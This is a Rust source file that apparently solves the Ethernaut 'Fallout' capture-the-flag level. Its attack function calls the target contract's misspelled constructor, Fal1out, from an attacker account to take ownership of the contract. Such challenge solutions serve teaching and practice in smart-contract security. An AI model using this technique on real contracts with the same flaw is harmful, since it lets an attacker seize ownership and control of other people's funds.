use async_trait::async_trait;
use ctf::Actor;
use ctf::ethernaut::lvl02_fallout::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let contract =
            Fallout::new(target.address, offender.provider().clone());

        contract
            .Fal1out()
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        Ok(())
    }
}
